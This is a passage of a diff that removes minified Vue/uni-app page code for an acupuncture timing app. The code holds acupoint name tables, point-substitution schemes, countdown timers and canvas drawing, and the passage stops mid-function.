-        _jw = __webpack_require__("6178"),
-        _lygPopup = _interopRequireDefault(__webpack_require__("c383")),
-        _vuex = __webpack_require__("8f59"),
-        _default = {
-          components: {
-            lyg_popup: _lygPopup.default
-          },
-          data: function () {
-            var e;
-            return {
-              level1: 3,
-              jingwei: {
-                jw: [30.4, 111],
-                places: ["\u6E56\u5317\u7701", "\u5B9C\u660C\u5E02", "\u897F\u9675\u533A"]
-              },
-              level2: "5",
-              isShowChinaTime: !1,
-              isLunar: !1,
-              banbent: "\u5168\u7403\u677F",
-              banbenf: !1,
-              visible: !1,
-              similar: !1,
-              time: "1973-07-29 10:30:36",
-              lntime: "2000-01-01 10:00:00",
-              date: Date.parse(new Date()),
-              ctx: "",
-              radio: 0,
-              moshi1: [{
-                text: "",
-                value: 0
-              }, {
-                text: "",
-                value: 1,
-                disable: !1
-              }],
-              radio2: 0,
-              moshi2: [{
-                text: "\u5929\u661F\u5730\u8109",
-                value: 0
-              }, {
-                text: "\u4E09\u624D\u4E00\u6C14",
-                value: 1
-              }, {
-                text: "\u6708\u6717\u661F\u8F89",
-                value: 2
-              }, {
-                text: "\u91D1\u98CE\u7389\u9732",
-                value: 3
-              }, {
-                text: "\u4E94\u8FD0\u516D\u6C14",
-                value: 4,
-                disable: !0
-              }, {
-                text: "\u6597\u7834\u82CD\u7A79",
-                value: 5,
-                disable: !0
-              }],
-              color: ["#d60014", "#ff0000", "#808000", "#5500ff", "#0080ff", "#804040"],
-              xueweiList: [],
-              showPopup: !1,
-              flippedImages: [],
-              xueweiMap: (e = {
-                "\u6D8C\u6CC9": "yongquan",
-                "\u675F\u9AA8": "shugu",
-                "\u6606\u4ED1": "kunlun",
-                "\u7136\u8C37": "rangu",
-                "\u8DB3\u901A\u8C37": "zutonggu",
-                "\u592A\u6EAA": "taixi",
-                "\u81F3\u9634": "zhiyin",
-                "\u4EAC\u9AA8": "jinggu",
-                "\u5927\u949F": "dazhong",
-                "\u9C7C\u9645": "yuji",
-                "\u9633\u6EAA": "yangxi",
-                "\u5C3A\u6CFD": "chize",
-                "\u4E8C\u95F4": "erjian",
-                "\u5C11\u5546": "shaoshang",
-                "\u4E09\u95F4": "sanjian",
-                "\u7ECF\u6E20": "jingqu",
-                "\u592A\u6E0A": "taiyuan",
-                "\u66F2\u6C60": "quchi",
-                "\u5408\u8C37": "hegu",
-                "\u5217\u7F3A": "lieque",
-                "\u5C11\u5E9C": "shaofu",
-                "\u9633\u8C37": "yanggu",
-                "\u5C11\u6D77": "shaohai",
-                "\u5C11\u51B2": "shaochong",
-                "\u524D\u8C37": "qiangu",
-                "\u540E\u6EAA": "houxi",
-                "\u7075\u9053": "lingdao",
-                "\u5C11\u6CFD": "shaoze",
-                "\u795E\u95E8": "shenmen",
-                "\u5C0F\u6D77": "xiaohai",
-                "\u901A\u91CC": "tongli",
-                "\u8155\u9AA8": "wangu",
-                "\u9633\u8F85": "yangfu",
-                "\u884C\u95F4": "xingjian",
-                "\u4FA0\u6EAA": "xiaxi",
-                "\u66F2\u6CC9": "ququan",
-                "\u8DB3\u4E34\u6CE3": "zulinqi",
-                "\u5927\u6566": "dadun",
-                "\u8DB3\u7A8D\u9634": "zuqiaoyin",
-                "\u4E2D\u5C01": "zhongfeng",
-                "\u592A\u51B2": "taichong",
-                "\u9633\u9675\u6CC9": "yanglingquan",
-                "\u4E18\u589F": "qiuxu",
-                "\u8821\u6C9F": "ligou",
-                "\u89E3\u6EAA": "xiexi",
-                "\u5927\u90FD": "dadu",
-                "\u5185\u5EAD": "neiting",
-                "\u9634\u9675\u6CC9": "yinlingquan",
-                "\u9677\u8C37": "xiangu",
-                "\u9690\u767D": "yinbai",
-                "\u5389\u5151": "lidui",
-                "\u5546\u4E18": "shangqiu",
-                "\u8DB3\u4E09\u91CC": "zusanli",
-                "\u592A\u767D": "taibai",
-                "\u51B2\u9633": "chongyang",
-                "\u516C\u5B59": "gongsun",
-                "\u5916\u5173": "waiguan",
-                "\u5185\u5173": "neiguan"
-              }, (0, _defineProperty2.default)(e, "\u5927\u6566", "dadun"), (0, _defineProperty2.default)(e, "\u5927\u9675", "daling"), (0, _defineProperty2.default)(e, "\u98DE\u626C", "feiyang"), (0, _defineProperty2.default)(e, "\u4E30\u9686", "fenglong"), (0, _defineProperty2.default)(e, "\u590D\u6E9C", "fuliu"), (0, _defineProperty2.default)(e, "\u5173\u51B2", "guanchong"), (0, _defineProperty2.default)(e, "\u5149\u660E", "guangming"), (0, _defineProperty2.default)(e, "\u95F4\u4F7F", "jianshi"), (0, _defineProperty2.default)(e, "\u52B3\u5BAB", "laogong"), (0, _defineProperty2.default)(e, "\u504F\u5386", "pianli"), (0, _defineProperty2.default)(e, "\u66F2\u6CFD", "quze"), (0, _defineProperty2.default)(e, "\u5546\u9633", "shangyang"), (0, _defineProperty2.default)(e, "\u5929\u4E95", "tianjing"), (0, _defineProperty2.default)(e, "\u59D4\u4E2D", "weizhong"), (0, _defineProperty2.default)(e, "\u9633\u6C60", "yangchi"), (0, _defineProperty2.default)(e, "\u6DB2\u95E8", "yemen"), (0, _defineProperty2.default)(e, "\u9634\u8C37", "yingu"), (0, _defineProperty2.default)(e, "\u652F\u6C9F", "zhigou"), (0, _defineProperty2.default)(e, "\u652F\u6B63", "zhizheng"), (0, _defineProperty2.default)(e, "\u4E2D\u51B2", "zhongchong"), (0, _defineProperty2.default)(e, "\u4E2D\u6E1A", "zhongzhu"), (0, _defineProperty2.default)(e, "\u7167\u6D77", "zhaohai"), (0, _defineProperty2.default)(e, "\u7533\u8109", "shenmai"), (0, _defineProperty2.default)(e, "\u957F\u5F3A", "changqiang"), (0, _defineProperty2.default)(e, "\u547D\u95E8", "mingmen"), (0, _defineProperty2.default)(e, "\u60AC\u67A2", "xuanshu"), (0, _defineProperty2.default)(e, "\u810A\u4E2D", "jizhong"), (0, _defineProperty2.default)(e, "\u9676\u9053", "taodao"), (0, _defineProperty2.default)(e, "\u8111\u6237", "naohu"), (0, _defineProperty2.default)(e, "\u767E\u4F1A", "baihui"), (0, _defineProperty2.default)(e, "\u5370\u5802", "yintang"), (0, _defineProperty2.default)(e, "\u81BB\u4E2D", "shanzhong"), (0, _defineProperty2.default)(e, "\u4E2D\u8118", "zhongwan"), (0, _defineProperty2.default)(e, "\u795E\u9619", "shenque"), (0, _defineProperty2.default)(e, "\u5173\u5143", "guanyuan"), (0, _defineProperty2.default)(e, "\u4E2D\u67A2", "zhongshu"), (0, _defineProperty2.default)(e, "\u9633\u5173", "yangguan"), (0, _defineProperty2.default)(e, "\u8170\u4FDE", "yaoshu"), (0, _defineProperty2.default)(e, "\u9F88\u4EA4", "yinjiao"), (0, _defineProperty2.default)(e, "\u5151\u7AEF", "duiduan"), (0, _defineProperty2.default)(e, "\u6C34\u6C9F", "shuigou"), (0, _defineProperty2.default)(e, "\u7D20\u9ACE", "suliao"), (0, _defineProperty2.default)(e, "\u795E\u5EAD", "shenting"), (0, _defineProperty2.default)(e, "\u4E0A\u661F", "shangxing"), (0, _defineProperty2.default)(e, "\u56DF\u4F1A", "xinhui"), (0, _defineProperty2.default)(e, "\u524D\u9876", "qianding"), (0, _defineProperty2.default)(e, "\u540E\u9876", "houding"), (0, _defineProperty2.default)(e, "\u5F3A\u95F4", "qiangjian"), (0, _defineProperty2.default)(e, "\u98CE\u5E9C", "fengfu"), (0, _defineProperty2.default)(e, "\u54D1\u95E8", "yamen"), (0, _defineProperty2.default)(e, "\u5927\u690E", "dazhui"), (0, _defineProperty2.default)(e, "\u8EAB\u67F1", "shenzhu"), (0, _defineProperty2.default)(e, "\u795E\u9053", "shendao"), (0, _defineProperty2.default)(e, "\u7075\u53F0", "lingtai"), (0, _defineProperty2.default)(e, "\u81F3\u9633", "zhiyang"), (0, _defineProperty2.default)(e, "\u7B4B\u7F29", "jinsuo"), e)
-            };
-          },
-          onLoad: function () {
-            var e = this;
-            uni.getSystemInfo({
-              success: function (t) {
-                e.systeminfo = t;
-              }
-            }), this.now2 = new Date().getTime();
-          },
-          onShow: function () {
-            uni.getStorageSync("storage_jw") ? this.jingwei = uni.getStorageSync("storage_jw") : __f__("log", "\u5730\u533A\u6CA1\u6709\u5B58\u6863", " at pages/index.vue:373"), this.getStorage() ? this.radio = this.getStorage() : (this.radio = 0, __f__("log", "\u6CA1\u6709\u5B58\u6863", " at pages/index.vue:381")), this.getStorage2() ? this.radio2 = this.getStorage2() : this.radio2 = 0, this.radio2 > 2 ? (this.moshi1[1].disable = !0, this.radio = 0) : this.moshi1[1].disable = !1, this.Set(), this.huabu(), this.currentTime2 = this.lntime;
-          },
-          mounted: function () {
-            var e = this;
-            setInterval(function () {
-              0 == e.biao ? e.date = e.lntime : e.date = Date.parse(new Date());
-            }, 1000), setInterval(function () {
-              0 == e.biao ? e.jishi2() : e.jishi();
-            }, 1000), setInterval(function () {
-              0 == e.biao || (e.Set(), e.huabu());
-            }, 60000);
-          },
-          methods: {
-            popupState: function (e) {
-              __f__("log", e, " at pages/index.vue:429");
-            },
-            Set: function () {
-              this.ming1 = "\u6559\u5B66\u5FAE\u4FE1\uFF1Apowerabacus", this.ming2 = "\u7A0B\u5E8F\u4E0B\u8F7D\uFF1A", this.ming3 = "\u97F3\u5F8B\u8D44\u6E90\uFF1A\u5C0F\u767D\u795E\u9488", this.shuoming1 = "\u9488\u6CD5\u7406\u8BBA\u3001\u7A74\u4F4D\u5B9A\u4F4D\u3001\u5B9E\u64CD\u7B49\u5B8C\u6574\u514D\u8D39\u516C\u76CA\u6559\u5B66\u3002", this.shuoming2 = "\u5230\u5FAE\u4FE1\u516C\u4F17\u53F7\uFF1A\u3010\u5C0F\u767D\u795E\u9488\u81EA\u5B66\u8BFE\u5802\u3011\u8F6F\u4EF6\u5E2E\u52A9\u677F\u5757\u4E0B\u8F7D\u3002", this.shuoming3 = "\u8BF7\u5148\u5B89\u88C5\u6296\u97F3\u540E\u4F7F\u7528\u3002\u6709\u5929\u97F3\u6B63\u8109\u7684\u4F7F\u7528\u65B9\u6CD5\u3001\u97F3\u5F8B\u5E93\u3001\u9488\u6CD5\u548C\u97F3\u5F8B\u6CBB\u7597\u7684\u6848\u4F8B\u3002\u70B9\u51FB\u8FDB\u5165\u3002", this.time = "1973-07-29 10:30:36", this.timef = !1, this.tihuanwenzi = ["\u7136\u8C37.\u6606\u4ED1", "\u8DB3\u901A\u8C37.\u9634\u8C37", "\u5C11\u5546.\u4E09\u95F4", "\u5546\u9633.\u7ECF\u6E20", "\u592A\u6E0A.\u66F2\u6C60", "\u795E\u95E8", "\u795E\u95E8 ", "\u9C7C\u9645.\u9633\u6EAA", "\u4E8C\u95F4.\u5C3A\u6CFD", "\u5C11\u51B2.\u540E\u6EAA", "\u5C11\u6CFD.\u7075\u9053", "\u795E\u95E8.\u5C0F\u6D77", "\u5C11\u5E9C.\u9633\u8C37", "\u652F\u6B63.\u901A\u91CC", "\u5C11\u5E9C.\u9633\u8C37", "\u524D\u8C37.\u5C11\u6D77", "\u5927\u6566.\u8DB3\u4E34\u6CE3", "\u8DB3\u7A8D\u9634.\u4E2D\u5C01", "\u592A\u51B2.\u9633\u9675\u6CC9", "\u516C\u5B59", "\u516C\u5B59 ", "\u884C\u95F4.\u9633\u8F85", "\u4FA0\u6EAA.\u66F2\u6CC9", "\u6D8C\u6CC9.\u675F\u9AA8", "\u81F3\u9634.\u590D\u6E9C", "\u592A\u6EAA.\u59D4\u4E2D", "\u8DB3\u901A\u8C37", "\u8DB3\u901A\u8C37 "], this.tihuanwenzip = ["\u524D\u8C37.\u5C11\u6D77", "\u65E0", "\u8DB3\u7A8D\u9634.\u4E2D\u5C01", "\u65E0", "\u5389\u5151.\u5546\u4E18", "\u65E0", "\u65E0", "\u5C11\u6CFD.\u7075\u9053", "\u81F3\u9634.\u590D\u6E9C", "\u884C\u95F4.\u9633\u8F85", "\u9C7C\u9645.\u9633\u6EAA", "\u5927\u90FD.\u89E3\u6EAA", "\u65E0", "\u65E0", "\u65E0", "\u7136\u8C37.\u6606\u4ED1", "\u65E0", "\u5C11\u5546.\u4E09\u95F4", "\u9690\u767D.\u9677\u8C37", "\u65E0", "\u65E0", "\u5C11\u51B2.\u540E\u6EAA", "\u6D8C\u6CC9.\u675F\u9AA8", "\u4FA0\u6EAA.\u66F2\u6CC9", "\u4E8C\u95F4.\u5C3A\u6CFD", "\u5185\u5EAD.\u9634\u9675\u6CC9", "\u65E0", "\u65E0"], this.tihuanwenzi2 = ["\u7136\u8C37.\u6606\u4ED1", "\u8DB3\u901A\u8C37.\u9634\u8C37", "\u5C11\u5546.\u4E09\u95F4", "\u5546\u9633.\u7ECF\u6E20", "\u592A\u6E0A.\u66F2\u6C60", "\u795E\u95E8", "\u795E\u95E8 ", "\u9C7C\u9645.\u9633\u6EAA", "\u4E8C\u95F4.\u5C3A\u6CFD", "\u5C11\u51B2.\u540E\u6EAA", "\u5C11\u6CFD.\u7075\u9053", "\u795E\u95E8.\u5C0F\u6D77", "\u5C11\u5E9C.\u9633\u8C37", "\u652F\u6B63.\u901A\u91CC", "\u5C11\u5E9C.\u9633\u8C37", "\u524D\u8C37.\u5C11\u6D77", "\u5927\u6566.\u8DB3\u4E34\u6CE3", "\u8DB3\u7A8D\u9634.\u4E2D\u5C01", "\u592A\u51B2.\u9633\u9675\u6CC9", "\u516C\u5B59", "\u516C\u5B59 ", "\u884C\u95F4.\u9633\u8F85", "\u4FA0\u6EAA.\u66F2\u6CC9", "\u6D8C\u6CC9.\u675F\u9AA8", "\u81F3\u9634.\u590D\u6E9C", "\u592A\u6EAA.\u59D4\u4E2D", "\u592A\u6EAA", "\u592A\u6EAA "], this.tihuanwenzip2 = ["\u524D\u8C37.\u5C11\u6D77", "\u65E0", "\u8DB3\u7A8D\u9634.\u4E2D\u5C01", "\u65E0", "\u5389\u5151.\u5546\u4E18", "\u65E0", "\u65E0", "\u5C11\u6CFD.\u7075\u9053", "\u81F3\u9634.\u590D\u6E9C", "\u884C\u95F4.\u9633\u8F85", "\u9C7C\u9645.\u9633\u6EAA", "\u5927\u90FD.\u89E3\u6EAA", "\u65E0", "\u65E0", "\u65E0", "\u7136\u8C37.\u6606\u4ED1", "\u65E0", "\u5C11\u5546.\u4E09\u95F4", "\u9690\u767D.\u9677\u8C37", "\u65E0", "\u65E0", "\u5C11\u51B2.\u540E\u6EAA", "\u6D8C\u6CC9.\u675F\u9AA8", "\u4FA0\u6EAA.\u66F2\u6CC9", "\u4E8C\u95F4.\u5C3A\u6CFD", "\u5185\u5EAD.\u9634\u9675\u6CC9", "\u5185\u5EAD", "\u9633\u9675\u6CC9"], this.tihuanwenzi3 = ["\u7136\u8C37.\u6606\u4ED1", "\u8DB3\u901A\u8C37.\u9634\u8C37", "\u5C11\u5546.\u4E09\u95F4", "\u5546\u9633.\u7ECF\u6E20", "\u592A\u6E0A.\u66F2\u6C60", "\u795E\u95E8", "\u795E\u95E8 ", "\u9C7C\u9645.\u9633\u6EAA", "\u4E8C\u95F4.\u5C3A\u6CFD", "\u5C11\u51B2.\u540E\u6EAA", "\u5C11\u6CFD.\u7075\u9053", "\u795E\u95E8.\u5C0F\u6D77", "\u5C11\u5E9C.\u9633\u8C37", "\u652F\u6B63.\u901A\u91CC", "\u5C11\u5E9C.\u9633\u8C37", "\u524D\u8C37.\u5C11\u6D77", "\u5927\u6566.\u8DB3\u4E34\u6CE3", "\u8DB3\u7A8D\u9634.\u4E2D\u5C01", "\u592A\u51B2.\u9633\u9675\u6CC9", "\u516C\u5B59", "\u516C\u5B59 ", "\u884C\u95F4.\u9633\u8F85", "\u4FA0\u6EAA.\u66F2\u6CC9", "\u6D8C\u6CC9.\u675F\u9AA8", "\u81F3\u9634.\u590D\u6E9C", "\u592A\u6EAA.\u59D4\u4E2D", "\u8DB3\u901A\u8C37", "\u8DB3\u901A\u8C37 "], this.tihuanwenzip3 = ["\u524D\u8C37.\u5C11\u6D77", "\u65E0", "\u8DB3\u7A8D\u9634.\u4E2D\u5C01", "\u65E0", "\u5389\u5151.\u5546\u4E18", "\u65E0", "\u65E0", "\u5C11\u6CFD.\u7075\u9053", "\u81F3\u9634.\u590D\u6E9C", "\u884C\u95F4.\u9633\u8F85", "\u9C7C\u9645.\u9633\u6EAA", "\u5927\u90FD.\u89E3\u6EAA", "\u65E0", "\u65E0", "\u65E0", "\u7136\u8C37.\u6606\u4ED1", "\u65E0", "\u5C11\u5546.\u4E09\u95F4", "\u9690\u767D.\u9677\u8C37", "\u65E0", "\u65E0", "\u5C11\u51B2.\u540E\u6EAA", "\u6D8C\u6CC9.\u675F\u9AA8", "\u4FA0\u6EAA.\u66F2\u6CC9", "\u4E8C\u95F4.\u5C3A\u6CFD", "\u5185\u5EAD.\u9634\u9675\u6CC9", "\u5185\u5EAD", "\u9633\u9675\u6CC9"], this.wuxingtihuan = [["\u6606\u4ED1.\u7136\u8C37", "\u8DB3\u901A\u8C37.\u9634\u8C37", "\u675F\u9AA8.\u6D8C\u6CC9", "\u81F3\u9634.\u590D\u6E9C", "\u59D4\u4E2D.\u592A\u6EAA", "\u4EAC\u9AA8.\u5927\u949F", "\u4EAC\u9AA8.\u5927\u949F"], ["\u9C7C\u9645.\u9633\u6EAA", "\u5C3A\u6CFD.\u4E8C\u95F4", "\u5C11\u5546.\u4E09\u95F4", "\u7ECF\u6E20.\u5546\u9633", "\u592A\u6E0A.\u66F2\u6C60", "\u5217\u7F3A.\u5408\u8C37", "\u5217\u7F3A.\u5408\u8C37"], ["\u5C11\u5E9C.\u9633\u8C37", "\u5C11\u6D77.\u524D\u8C37", "\u5C11\u51B2.\u540E\u6EAA", "\u7075\u9053.\u5C11\u6CFD", "\u795E\u95E8.\u5C0F\u6D77", "\u901A\u91CC.\u8155\u9AA8", "\u901A\u91CC.\u8155\u9AA8"], ["\u9633\u8F85.\u884C\u95F4", "\u4FA0\u6EAA.\u66F2\u6CC9", "\u8DB3\u4E34\u6CE3.\u5927\u6566", "\u8DB3\u7A8D\u9634.\u4E2D\u5C01", "\u9633\u9675\u6CC9.\u592A\u51B2", "\u4E18\u589F.\u8821\u6C9F", "\u4E18\u589F.\u8821\u6C9F"], ["\u89E3\u6EAA.\u5927\u90FD", "\u5185\u5EAD.\u9634\u9675\u6CC9", "\u9677\u8C37.\u9690\u767D", "\u5389\u5151.\u5546\u4E18", "\u8DB3\u4E09\u91CC.\u592A\u767D", "\u51B2\u9633.\u516C\u5B59", "\u516C\u5B59.\u51B2\u9633"]], this.siyutihuan = ["\u4E2D\u67A2", "\u810A\u4E2D", "\u60AC\u67A2", "\u547D\u95E8", "\u9633\u5173", "\u8170\u4FDE", "\u957F\u5F3A", "\u9F88\u4EA4", "\u5151\u7AEF", "\u6C34\u6C9F", "\u7D20\u9ACE", "\u795E\u5EAD", "\u4E0A\u661F", "\u56DF\u4F1A", "\u524D\u9876", "\u767E\u4F1A", "\u540E\u9876", "\u5F3A\u95F4", "\u8111\u6237", "\u98CE\u5E9C", "\u54D1\u95E8", "\u5927\u690E", "\u9676\u9053", "\u8EAB\u67F1", "\u795E\u9053", "\u7075\u53F0", "\u81F3\u9633", "\u7B4B\u7F29"], this.zhi = ["\u4E18\u589F", "\u592A\u51B2", "\u592A\u6E0A", "\u5408\u8C37", "\u51B2\u9633", "\u592A\u767D", "\u795E\u95E8", "\u8155\u9AA8", "\u4EAC\u9AA8", "\u592A\u6EAA", "\u5927\u9675", "\u9633\u6C60"], this.zhi2 = ["\u957F\u5F3A", "\u547D\u95E8", "\u60AC\u67A2", "\u810A\u4E2D", "\u9676\u9053", "\u8111\u6237", "\u767E\u4F1A", "\u5370\u5802", "\u81BB\u4E2D", "\u4E2D\u8118", "\u795E\u9619", "\u5173\u5143"];
-              var e = new Date(),
-                t = new Date("2026/10/01 00:00"),
-                n = (t.getTime() - e.getTime()) / 1000;
-              n >= 0 ? this.dateFormat(new Date()) : uni.navigateTo({
-                url: "/pages/kong/kong2"
-              }), this.radio2 < 4 ? this.ishow = !0 : this.ishow = !1;
-            },
-            showText: function (e) {
-              e && (this.xueweiList = String(e).split(".").filter(function (e) {
-                return !!e;
-              }), this.showPopup = !0);
-            },
-            closePopup: function () {
-              this.showPopup = !1;
-            },
-            toggleFlip: function (e) {
-              this.$set(this.flippedImages, e, !this.flippedImages[e]);
-            },
-            Xshowt: function () {
-              this.biao = 1, this.Set(), this.huabu();
-            },
-            Xshows: function (e) {
-              this.startY = e.changedTouches[0].y, e.changedTouches[0].x < 120 && (this.biao = 0);
-            },
-            Xshowd: function (e) {
-              e && (this.y = e.changedTouches[0].y);
-              new Date().getTime(), this.now2;
-              var t = this.startY - e.changedTouches[0].y;
-              if (e.changedTouches[0].x < 120 & Math.abs(t) > 250) {
-                this.now2 = new Date().getTime();
-                var n = this.lntime,
-                  r = n.replace(/-/g, "/");
-                r = Date.parse(r), r += 1000 * t * 60;
-                var i = new Date(r),
-                  o = (t = i.getFullYear(), i.getMonth() + 1 < 10 ? "0" + (i.getMonth() + 1) : i.getMonth() + 1),
-                  a = i.getDate() < 10 ? "0" + i.getDate() : i.getDate(),
-                  s = i.getHours() < 10 ? "0" + i.getHours() : i.getHours(),
-                  u = i.getMinutes() < 10 ? "0" + i.getMinutes() : i.getMinutes(),
-                  c = i.getSeconds() < 10 ? "0" + i.getSeconds() : i.getSeconds();
-                this.lntime = t + "-" + o + "-" + a + " " + s + ":" + u + ":" + c, this.huabu();
-              }
-              var l = uni.createCanvasContext("myCanvas2", this),
-                f = this.systeminfo.windowWidth,
-                d = f / 440;
-              l.scale(d, d);
-              var h = this.y / d;
-              if (h > 25 & h < 745 & e.changedTouches[0].x > 120) {
-                for (var p = Math.abs(h - 25), g = 0; g < this.lding.length; g++) {
-                  var v = Math.abs(p - this.lding[g] / this.ZY.yueliang * 720);
-                  v < 10 && (p = this.lding[g] / this.ZY.yueliang * 720, h = p + 20);
-                }
-                for (g = 0; g < this.ding.length; g++) {
-                  v = Math.abs(p - this.ding[g] / this.ZY.yueliang * 720);
-                  v < 10 && (p = this.ding[g] / this.ZY.yueliang * 720, h = p + 20);
-                }
-                n = this.lntime, r = n.replace(/-/g, "/");
-                r = Date.parse(r), r += 60 * p * 1000;
-                i = new Date(r), t = i.getFullYear(), o = i.getMonth() + 1 < 10 ? "0" + (i.getMonth() + 1) : i.getMonth() + 1, a = i.getDate() < 10 ? "0" + i.getDate() : i.getDate(), s = i.getHours() < 10 ? "0" + i.getHours() : i.getHours(), u = i.getMinutes() < 10 ? "0" + i.getMinutes() : i.getMinutes(), c = i.getSeconds() < 10 ? "0" + i.getSeconds() : i.getSeconds();
-                var m = t + "-" + o + "-" + a + " " + s + ":" + u + ":" + c;
-                l.save(), l.lineWidth = 3, l.strokeStyle = "#ffffff", l.beginPath(), l.moveTo(0, h), l.lineTo(220, h), l.stroke(), l.restore(), l.font = "18px Arial", l.fillStyle = "#ffffff", l.fillText(m, 50, h - 5);
-              }
-              setTimeout(function () {
-                l.draw();
-              }, 50);
-            },
-            Xshow: function (e) {
-              e && (this.y = e.changedTouches[0].y);
-              var t = new Date().getTime() - this.now2,
-                n = this.startY - e.changedTouches[0].y;
-              if (t > 60 & e.changedTouches[0].x < 120 & Math.abs(n) < 250) {
-                this.now2 = new Date().getTime();
-                var r = this.lntime,
-                  i = r.replace(/-/g, "/");
-                i = Date.parse(i), i += 1000 * n;
-                var o = new Date(i),
-                  a = (n = o.getFullYear(), o.getMonth() + 1 < 10 ? "0" + (o.getMonth() + 1) : o.getMonth() + 1),
-                  s = o.getDate() < 10 ? "0" + o.getDate() : o.getDate(),
-                  u = o.getHours() < 10 ? "0" + o.getHours() : o.getHours(),
-                  c = o.getMinutes() < 10 ? "0" + o.getMinutes() : o.getMinutes(),
-                  l = o.getSeconds() < 10 ? "0" + o.getSeconds() : o.getSeconds();
-                this.lntime = n + "-" + a + "-" + s + " " + u + ":" + c + ":" + l, this.huabu();
-              }
-              var f = uni.createCanvasContext("myCanvas2", this),
-                d = this.systeminfo.windowWidth,
-                h = d / 440;
-              f.scale(h, h);
-              var p = this.y / h;
-              if (p > 25 & p < 745 & e.changedTouches[0].x > 120) {
-                for (var g = Math.abs(p - 25), v = 0; v < this.lding.length; v++) {
-                  var m = Math.abs(g - this.lding[v] / this.ZY.yueliang * 720);
-                  m < 10 && (g = this.lding[v] / this.ZY.yueliang * 720, p = g + 20);
-                }
-                for (v = 0; v < this.ding.length; v++) {
-                  m = Math.abs(g - this.ding[v] / this.ZY.yueliang * 720);
-                  m < 10 && (g = this.ding[v] / this.ZY.yueliang * 720, p = g + 20);
-                }
-                r = this.lntime, i = r.replace(/-/g, "/");
-                i = Date.parse(i), i += 60 * g * 1000;
-                o = new Date(i), n = o.getFullYear(), a = o.getMonth() + 1 < 10 ? "0" + (o.getMonth() + 1) : o.getMonth() + 1, s = o.getDate() < 10 ? "0" + o.getDate() : o.getDate(), u = o.getHours() < 10 ? "0" + o.getHours() : o.getHours(), c = o.getMinutes() < 10 ? "0" + o.getMinutes() : o.getMinutes(), l = o.getSeconds() < 10 ? "0" + o.getSeconds() : o.getSeconds();
-                var _ = n + "-" + a + "-" + s + " " + u + ":" + c + ":" + l;
-                f.save(), f.lineWidth = 3, f.strokeStyle = "#ffffff", f.beginPath(), f.moveTo(0, p), f.lineTo(220, p), f.stroke(), f.restore(), f.font = "18px Arial", f.fillStyle = "#ffffff", f.fillText(_, 50, p - 5);
-              }
-              setTimeout(function () {
-                f.draw();
-              }, 50);
-            },
-            jishi: function () {
-              var e = uni.createCanvasContext("myCanvas3", this),
-                t = this.systeminfo.windowWidth,
-                n = t / 440;
-              e.scale(n, n), e.translate(0, 25);
-              var r = new Date(),
-                i = (r.getTime() - this.now.getTime()) / 1000,
-                o = Math.round(this.t1 - i);
-              o <= 0 && this.huabu();
-              var a = Math.floor(o / 3600) >= 10 ? Math.floor(o / 3600) : "0" + Math.floor(o / 3600);
-              o -= 3600 * a;
-              var s = Math.floor(o / 60) >= 10 ? Math.floor(o / 60) : "0" + Math.floor(o / 60);
-              o -= 60 * s;
-              var u = o >= 10 ? o : "0" + o,
-                c = a + ":" + s + ":" + u,
-                l = Math.round(this.t2 - i),
-                f = Math.floor(l / 3600) >= 10 ? Math.floor(l / 3600) : "0" + Math.floor(l / 3600);
-              l -= 3600 * f;
-              var d = Math.floor(l / 60) >= 10 ? Math.floor(l / 60) : "0" + Math.floor(l / 60);
-              l -= 60 * d;
-              var h = l >= 10 ? l : "0" + l,
-                p = f + ":" + d + ":" + h,
-                g = Math.round(this.t3 - i),
-                v = Math.floor(g / 3600) >= 10 ? Math.floor(g / 3600) : "0" + Math.floor(g / 3600);
-              g -= 3600 * v;
-              var m = Math.floor(g / 60) >= 10 ? Math.floor(g / 60) : "0" + Math.floor(g / 60);
-              g -= 60 * m;
-              var _ = g >= 10 ? g : "0" + g,
-                y = v + ":" + m + ":" + _;
-              if (e.save(), e.font = "16px Arial", this.radio2 < 3 && (this.t1 - i <= 1800 ? (e.fillStyle = "#d60014", e.fillText(c, 82, -9)) : (e.fillStyle = "#000000", e.fillText(c, 82, -9))), 4 == this.radio2) var w = !1;else if (3 == this.radio2 || 5 == this.radio2) w = !1;else w = !0;
-              w && (this.t2 - i <= 1800 ? (e.fillStyle = "#d60014", e.fillText(p, 0, -9)) : (e.fillStyle = "#000000", e.fillText(p, 0, -9))), 1 != this.radio2 && 2 != this.radio2 || (this.t3 - i <= 1800 ? (e.fillStyle = "#d60014", e.fillText(y, 152, -9)) : (e.fillStyle = "#000000", e.fillText(y, 152, -9))), e.restore(), setTimeout(function () {
-                e.draw();
-              }, 50);
-            },
-            jishi2: function () {
-              var e = uni.createCanvasContext("myCanvas3", this),
-                t = this.systeminfo.windowWidth,
-                n = t / 440;
-              e.scale(n, n), e.translate(0, 25);
-              var r = Math.round(this.t1);
-              r <= 0 && this.huabu();
-              var i = Math.floor(r / 3600) >= 10 ? Math.floor(r / 3600) : "0" + Math.floor(r / 3600);
-              r -= 3600 * i;
-              var o = Math.floor(r / 60) >= 10 ? Math.floor(r / 60) : "0" + Math.floor(r / 60);
-              r -= 60 * o;
-              var a = r >= 10 ? r : "0" + r,
-                s = i + ":" + o + ":" + a,
-                u = Math.round(this.t2),
-                c = Math.floor(u / 3600) >= 10 ? Math.floor(u / 3600) : "0" + Math.floor(u / 3600);
-              u -= 3600 * c;
-              var l = Math.floor(u / 60) >= 10 ? Math.floor(u / 60) : "0" + Math.floor(u / 60);
-              u -= 60 * l;
-              var f = u >= 10 ? u : "0" + u,
-                d = c + ":" + l + ":" + f,
-                h = Math.round(this.t3),
-                p = Math.floor(h / 3600) >= 10 ? Math.floor(h / 3600) : "0" + Math.floor(h / 3600);
-              h -= 3600 * p;
-              var g = Math.floor(h / 60) >= 10 ? Math.floor(h / 60) : "0" + Math.floor(h / 60);
-              h -= 60 * g;
-              var v = h >= 10 ? h : "0" + h,
-                m = p + ":" + g + ":" + v;
-              if (e.save(), e.font = "16px Arial", this.radio2 < 3 && (this.t1 <= 1800 ? (e.fillStyle = "#d60014", e.fillText(s, 82, -9)) : (e.fillStyle = "#000000", e.fillText(s, 82, -9))), 4 == this.radio2) var _ = !1;else if (3 == this.radio2 || 5 == this.radio2) _ = !1;else _ = !0;
-              _ && (this.t2 <= 1800 ? (e.fillStyle = "#d60014", e.fillText(d, 0, -9)) : (e.fillStyle = "#000000", e.fillText(d, 0, -9))), 1 != this.radio2 && 2 != this.radio2 || (this.t3 <= 1800 ? (e.fillStyle = "#d60014", e.fillText(m, 152, -9)) : (e.fillStyle = "#000000", e.fillText(m, 152, -9))), e.restore(), setTimeout(function () {
-                e.draw();
-              }, 50);
-            },
-            huabu: function () {
-              switch (this.radio) {
-                case 0:
